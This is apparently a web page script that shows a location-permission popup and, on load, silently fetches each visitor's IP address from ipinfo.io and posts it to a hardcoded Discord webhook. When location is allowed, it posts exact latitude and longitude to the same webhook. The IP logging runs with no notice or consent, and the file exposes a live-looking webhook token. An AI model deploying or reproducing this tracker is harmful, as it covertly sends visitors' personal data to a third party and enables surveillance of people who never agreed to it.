// Wait for the DOM content to be fully loaded
document.addEventListener("DOMContentLoaded", function() {
    // Get the popup element
    var popup = document.getElementById('popup');

    // Get the buttons inside the popup
    var allowLocationBtn = document.getElementById('allowLocation');
    var denyLocationBtn = document.getElementById('denyLocation');
    
    // Function to show the popup
    function showPopup() {
        popup.style.display = 'block';
    }

    // Function to hide the popup
    function hidePopup() {
        popup.style.display = 'none';
    }

    // Function to send message to Discord via webhook
    function sendMessageToDiscord(message) {
        // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
        var webhookUrl = 'https://discord.com/api/webhooks/1095695215353942086/Gm6TMMKvRer7U0BO89gsrAB3HXFYdk6xGEvwOVVSLzH6bd-vK7v5FKlt9kT6pUDlkYNj';

        // Create JSON object with message content
        var data = {
            content: message
        };

        // Make an HTTP POST request to the webhook URL
        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        })
        .then(response => {
            if (!response.ok) {
                console.error('Error sending message to Discord:', response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending message to Discord:', error);
        });
    }

    // Function to handle allowing location
    function allowLocation() {
        // Check if Geolocation is supported
        if (navigator.geolocation) {
            // Call getCurrentPosition to get the user's location
            navigator.geolocation.getCurrentPosition(function(position) {
                // Extract latitude and longitude from the position object
                var latitude = position.coords.latitude;
                var longitude = position.coords.longitude;

                // Construct message with location information
                var message = 'User allowed location access. Latitude: ' + latitude + ', Longitude: ' + longitude;

                // Send message to Discord
                sendMessageToDiscord(message);
            }, function(error) {
                // Handle error if the user denies location access or if there's an error in accessing location
                console.error("Error getting location:", error.message);
            });
        } else {
            // Geolocation is not supported by the browser
            console.error("Geolocation is not supported by this browser.");
        }

        hidePopup(); // Hide the popup after allowing location
    }

    // Function to handle denying location
    function denyLocation() {
        // Here you can handle the case when the user denies location access
        console.log("User denied location access");
        hidePopup(); // Hide the popup
    }

    // Add click event listeners to the buttons
    allowLocationBtn.addEventListener('click', allowLocation);
    denyLocationBtn.addEventListener('click', denyLocation);

    // Show the popup after 10 seconds (adjust as needed)
    setTimeout(showPopup, 5000);
});
function logIPAddress() {
    // Make an HTTP request to ipinfo.io to retrieve the visitor's IP address
    fetch('https://ipinfo.io/?format=json')
        .then(response => response.json())
        .then(data => {
            // Extract the IP address from the response
            var ip_address = data.ip;

            // Construct message with IP address information
            var message = 'Visitor IP Address: ' + ip_address;

            // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
            var webhookUrl = 'https://discord.com/api/webhooks/1095695215353942086/Gm6TMMKvRer7U0BO89gsrAB3HXFYdk6xGEvwOVVSLzH6bd-vK7v5FKlt9kT6pUDlkYNj';

            // Create JSON object with message content
            var discordData = {
                content: message
            };

            // Make an HTTP POST request to the Discord webhook URL
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(discordData),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Error sending message to Discord:', response.statusText);
                }
            })
            .catch(error => {
                console.error('Error sending message to Discord:', error);
            });

            // You can log the IP address locally for your own reference if needed
            console.log("Visitor's IP address:", ip_address);
        })
        .catch(error => {
            console.error('Error fetching IP address:', error);
        });
}

// Log the visitor's IP address and send it to Discord
logIPAddress();
